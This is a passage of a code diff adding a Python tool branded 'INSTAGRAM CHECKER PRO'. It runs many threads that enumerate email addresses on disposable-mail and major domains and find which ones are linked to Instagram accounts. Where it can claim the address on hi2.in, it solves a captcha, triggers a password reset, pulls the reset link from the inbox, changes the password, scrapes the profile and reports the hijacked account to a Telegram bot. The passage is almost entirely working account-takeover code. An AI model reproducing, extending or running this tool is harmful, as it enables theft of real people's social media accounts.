+            if extracted_link:
+                reset_link = extracted_link
+                ws.close()
+    
+    def on_error(ws, error):
+        pass
+    
+    def on_close(ws, close_status_code, close_msg):
+        pass
+    
+    def on_open(ws):
+        ws.send(ws_token)
+    
+    ws = websocket.WebSocketApp(WEBSOCKET_URL, on_open=on_open, on_message=on_message, on_error=on_error, on_close=on_close)
+    ws.run_forever()
+    
+    if reset_link:
+        final_username, success = code2_full_password_change(reset_link, username)
+        if success:
+            return final_username if final_username else username
+    return None
+
+def code2_run_reset_flow(email):
+    try:
+        prefix = email.split('@')[0]
+        full_domain = '@' + email.split('@')[1]
+        captcha = solve_recaptcha()
+        if not captcha:
+            return None
+        headers = {
+            'accept': 'application/json',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'origin': 'https://hi2.in',
+        }
+        data = {'domain': full_domain, 'prefix': prefix, 'recaptcha': captcha}
+        response = requests.post('https://hi2.in/api/custom', headers=headers, data=data, timeout=30)
+        if response.status_code == 200:
+            result = response.json()
+            if 'email' in result and 'expiry' in result and 'hash' in result:
+                code2_send_rest_request(email)
+                username = code2_listen_and_process(result['email'], result['expiry'], result['hash'])
+                return username
+        return None
+    except:
+        return None
+
+def code3_get_profile_info(username):
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0'}
+        response = requests.get(f'https://www.instagram.com/{username}/', 
+                               headers=headers, 
+                               timeout=10)
+        
+        with open(f"{username}_raw.txt", "w", encoding="utf-8") as f:
+            f.write(response.text)
+        
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        title_tag = soup.find('meta', property='og:title')
+        desc_tag = soup.find('meta', attrs={'name': 'description'})
+        
+        name = "N/A"
+        posts = "0"
+        followers = "0"
+        following = "0"
+        
+        if title_tag and title_tag.get('content'):
+            title = title_tag['content']
+            if '(@' in title:
+                name = title.split('(@')[0].strip()
+        
+        if desc_tag and desc_tag.get('content'):
+            desc = desc_tag['content'].lower()
+            
+            posts_match = re.search(r'([\d,]+)\s*posts?', desc)
+            if posts_match:
+                posts = posts_match.group(1).replace(',', '')
+            
+            followers_match = re.search(r'([\d,]+)\s*followers?', desc)
+            if followers_match:
+                followers = followers_match.group(1).replace(',', '')
+            
+            following_match = re.search(r'([\d,]+)\s*following', desc)
+            if following_match:
+                following = following_match.group(1).replace(',', '')
+        
+        return name, posts, followers, following
+    except:
+        return "N/A", "0", "0", "0"
+
+def worker(token, chat_id, domain, hits_file):
+    global hit_count, bad_ig_count, bad_mail_count, bad_rest_count, error_count, total_count, rps_counter, current_email
+    while not stop_flag:
+        try:
+            while True:
+                username = ''.join(random.choice(CHARSET) for _ in range(USERNAME_LENGTH))
+                email = f"{username}{domain}"
+                with username_lock:
+                    if email not in used_usernames:
+                        used_usernames.add(email)
+                        break
+            current_email = email
+            with stats_lock:
+                total_count += 1
+                rps_counter += 1
+
+            ig_result = check_instagram(email)
+            if ig_result:
+                if domain in ["@hi2.in", "@telegmail.com"]:
+                    hi2_result = check_hi2(email, domain)
+                    if hi2_result is True:
+                        rest_result = confirm_rest(email)
+                        if rest_result:
+                            with stats_lock:
+                                hit_count += 1
+                            with open(hits_file, 'a', encoding='utf-8') as f:
+                                f.write(f"{email}\n")
+                            
+                            media_path = get_next_media()
+                            extracted_username = code2_run_reset_flow(email)
+                            if extracted_username:
+                                name, posts, followers, following = code3_get_profile_info(extracted_username)
+                                send_telegram_final_report(token, chat_id, email, domain, extracted_username, name, posts, followers, following, media_path)
+                            else:
+                                send_telegram_final_report(token, chat_id, email, domain, "UNKNOWN", "N/A", "0", "0", "0", media_path)
+                        else:
+                            with stats_lock:
+                                bad_rest_count += 1
+                    elif hi2_result is False:
+                        with stats_lock:
+                            bad_mail_count += 1
+                    else:
+                        with stats_lock:
+                            error_count += 1
+                else:
+                    rest_result = confirm_rest(email)
+                    if rest_result:
+                        with stats_lock:
+                            hit_count += 1
+                        with open(hits_file, 'a', encoding='utf-8') as f:
+                            f.write(f"{email}\n")
+                        
+                        media_path = get_next_media()
+                        extracted_username = code2_run_reset_flow(email)
+                        if extracted_username:
+                            name, posts, followers, following = code3_get_profile_info(extracted_username)
+                            send_telegram_final_report(token, chat_id, email, domain, extracted_username, name, posts, followers, following, media_path)
+                        else:
+                            send_telegram_final_report(token, chat_id, email, domain, "UNKNOWN", "N/A", "0", "0", "0", media_path)
+                    else:
+                        with stats_lock:
+                            bad_rest_count += 1
+            else:
+                with stats_lock:
+                    bad_ig_count += 1
+        except:
+            with stats_lock:
+                error_count += 1
+def display():
+    global current_domain_name, current_threads
+    while not stop_flag:
+        elapsed = int(time.time() - start_time) if start_time else 0
+        not_registered = total_count - hit_count
+        if not_registered < 0:
+            not_registered = 0
+
+        rainbow = [Colors.RED, Colors.ORANGE, Colors.YELLOW, Colors.GREEN, Colors.BLUE, Colors.INDIGO, Colors.VIOLET]
+        labels = ["Total Checked", "Hits Found", "Not Registered", "Errors", "Speed", "Time", "Domain", "Threads", "Current Password", "Telegram"]
+        values = [
+            str(total_count),
+            str(hit_count),
+            str(not_registered),
+            str(error_count),
+            f"{rps_value:.2f}/s",
+            f"{elapsed}s",
+            str(current_domain_name),
+            str(current_threads),
+            str(NEW_PASSWORD),
+            "Active"
+        ]
+
+        label_width = max(len(label) for label in labels) + 4
+        value_width = max(len(value) for value in values) + 4
+        if label_width < 24:
+            label_width = 24
+        if value_width < 18:
+            value_width = 18
+
+        sys.stdout.write('\033[H\033[J')
+        sys.stdout.flush()
+
+        print("\n" * 18)
+
+        header_width = label_width + value_width + 7
+        print(f"{Colors.RED}╔{'═' * header_width}╗{Colors.Rn}")
+        print(f"{Colors.ORANGE}║{' ' * ((header_width - 35) // 2)}INSTAGRAM CHECKER PRO - PREMIUM{' ' * ((header_width - 35) // 2)}║{Colors.Rn}")
+        print(f"{Colors.YELLOW}║{' ' * ((header_width - 27) // 2)}Developer: {OWNER_NAME}{' ' * ((header_width - 27) // 2)}║{Colors.Rn}")
+        print(f"{Colors.GREEN}║{' ' * ((header_width - 24) // 2)}Fast • Reliable • Elite{' ' * ((header_width - 24) // 2)}║{Colors.Rn}")
+        print(f"{Colors.BLUE}╚{'═' * header_width}╝{Colors.Rn}")
+        print("")
+
+        separator = f"{Colors.VIOLET}├{'─' * (label_width + 2)}┼{'─' * (value_width + 2)}┤{Colors.Rn}"
+
+        for i, (label, value) in enumerate(zip(labels, values)):
+            if label == "Hits Found" or label == "Speed" or label == "Time":
+                col = Colors.RED if i % 2 == 0 else Colors.GREEN
+            else:
+                col = rainbow[i % len(rainbow)]
+            print(f"{col}│ {label:<{label_width}} │ {value:>{value_width}} │{Colors.Rn}")
+            if i < len(labels) - 1:
+                print(separator)
+
+        print(separator)
+        print(f"{Colors.C}│ {Colors.M}Search{Colors.C}{' ' * (label_width - 6)} │ {Colors.W}{current_email:<{value_width}}{Colors.C} │{Colors.Rn}")
+        print(f"{Colors.RED}╚{'═' * (label_width + value_width + 5)}╝{Colors.Rn}")
+        print(f"{Colors.YELLOW}By: Ctrl+C to stop | HIT #{hit_count}{Colors.Rn}")
+
+        time.sleep(0.3)
+
+def rps_updater():
+    global rps_counter, rps_value, rps_time
+    while not stop_flag:
+        time.sleep(1)
+        now = time.time()
+        elapsed = now - rps_time
+        if elapsed > 0:
+            with stats_lock:
+                rps_value = rps_counter / elapsed
+                rps_counter = 0
+        rps_time = now
+
+def load_config():
+    if os.path.exists(CONFIG_FILE):
+        try:
+            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
+                return json.load(f)
+        except:
+            pass
+    return {}
+
+def save_config(data):
+    try:
+        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
+            json.dump(data, f, indent=2)
+    except:
+        pass
+def main():
+    global stop_flag, start_time, current_domain_name, current_threads
+
+    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════════╗{Colors.Rn}")
+    print(f"{Colors.ORANGE}║              INSTAGRAM CHECKER PRO - PREMIUM              {Colors.Rn}")
+    print(f"{Colors.YELLOW}║                   Developer: {OWNER_NAME}                   {Colors.Rn}")
+    print(f"{Colors.GREEN}║                      Fast • Reliable • Elite               {Colors.Rn}")
+    print(f"{Colors.BLUE}╚══════════════════════════════════════════════════════════════╝{Colors.Rn}")
+
+    cfg = load_config()
+    saved_token = cfg.get("token", "")
+    saved_chat_id = cfg.get("chat_id", "")
+
+    token = ""
+    chat_id = ""
+
+    use_saved = input(f"{Colors.C}Use saved settings? (Y/n): {Colors.Rn}").strip().lower()
+
+    if use_saved == 'y' or use_saved == '':
+        if saved_token and saved_chat_id:
+            token = saved_token
+            chat_id = saved_chat_id
+            print(f"{Colors.GREEN}[+] Using saved settings.{Colors.Rn}")
+        else:
+            print(f"{Colors.YELLOW}[!] No saved settings found. Please enter manually.{Colors.Rn}")
+            token = input(f"{Colors.Y}Enter Telegram Token: {Colors.Rn}").strip()
+            chat_id = input(f"{Colors.Y}Enter Telegram Chat ID: {Colors.Rn}").strip()
+            save_config({"token": token, "chat_id": chat_id})
+    else:
+        token = input(f"{Colors.Y}Enter Telegram Token: {Colors.Rn}").strip()
+        chat_id = input(f"{Colors.Y}Enter Telegram Chat ID: {Colors.Rn}").strip()
+        save_config({"token": token, "chat_id": chat_id})
+
+    print(f"\n{Colors.RED}{'='*60}{Colors.Rn}")
+    print(f"{Colors.ORANGE}SELECT DOMAIN:{Colors.Rn}")
+    print(f"{Colors.YELLOW}{'='*60}{Colors.Rn}")
+    print(f"  {Colors.RED}1-{Colors.Rn}  {Colors.GREEN}@hi2.in{Colors.Rn}")
+    print(f"  {Colors.RED}2-{Colors.Rn}  {Colors.GREEN}@telegmail.com{Colors.Rn}")
+    print(f"  {Colors.RED}3-{Colors.Rn}  {Colors.GREEN}@gmail.com{Colors.Rn}")
+    print(f"  {Colors.RED}4-{Colors.Rn}  {Colors.GREEN}@yahoo.com{Colors.Rn}")
+    print(f"  {Colors.RED}5-{Colors.Rn}  {Colors.GREEN}@outlook.com{Colors.Rn}")
+    print(f"  {Colors.RED}6-{Colors.Rn}  {Colors.GREEN}@hotmail.com{Colors.Rn}")
+    print(f"  {Colors.RED}7-{Colors.Rn}  {Colors.GREEN}@icloud.com{Colors.Rn}")
+    print(f"  {Colors.RED}8-{Colors.Rn}  {Colors.GREEN}@proton.me{Colors.Rn}")
+    print(f"{Colors.BLUE}{'='*60}{Colors.Rn}")
+
+    ch = input(f"\n{Colors.INDIGO}Enter number (1-8): {Colors.Rn}").strip()
+    info = DOMAINS.get(ch, DOMAINS["1"])
+    current_domain_name = info['name']
+
+    default_tc = info.get("default_threads", 50)
+    try:
+        tc_input = input(f"{Colors.VIOLET}Threads (default {default_tc}): {Colors.Rn}").strip()
+        if tc_input == "":
+            tc = default_tc
+        else:
+            tc = int(tc_input)
+    except:
+        tc = default_tc
+    current_threads = tc
+
+    print(f"\n{Colors.GREEN}Starting with {tc} threads on {info['name']}{Colors.Rn}\n")
+
+    start_time = time.time()
+
+    threading.Thread(target=display, daemon=True).start()
+    threading.Thread(target=rps_updater, daemon=True).start()
+
+    for _ in range(tc):
+        threading.Thread(target=worker, args=(token, chat_id, info['domain'], HITS_FILES[info['domain']]), daemon=True).start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        stop_flag = True
+        elapsed = int(time.time() - start_time)
+        print(f"\n\n{Colors.RED}FINAL STATS:{Colors.Rn}")
+        print(f"  {Colors.GREEN}Hits: {hit_count}{Colors.Rn}")
+        print(f"  {Colors.ORANGE}Search: {bad_ig_count}{Colors.Rn}")
+        print(f"  {Colors.YELLOW}Errors: {error_count}{Colors.Rn}")
+        print(f"  {Colors.BLUE}Time: {elapsed}s{Colors.Rn}")
+
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{Colors.YELLOW}[*] finishing program...{Colors.Rn}")
+    except Exception as e:
+        print(f"\n{Colors.RED}[!] Error: {e}{Colors.Rn}")
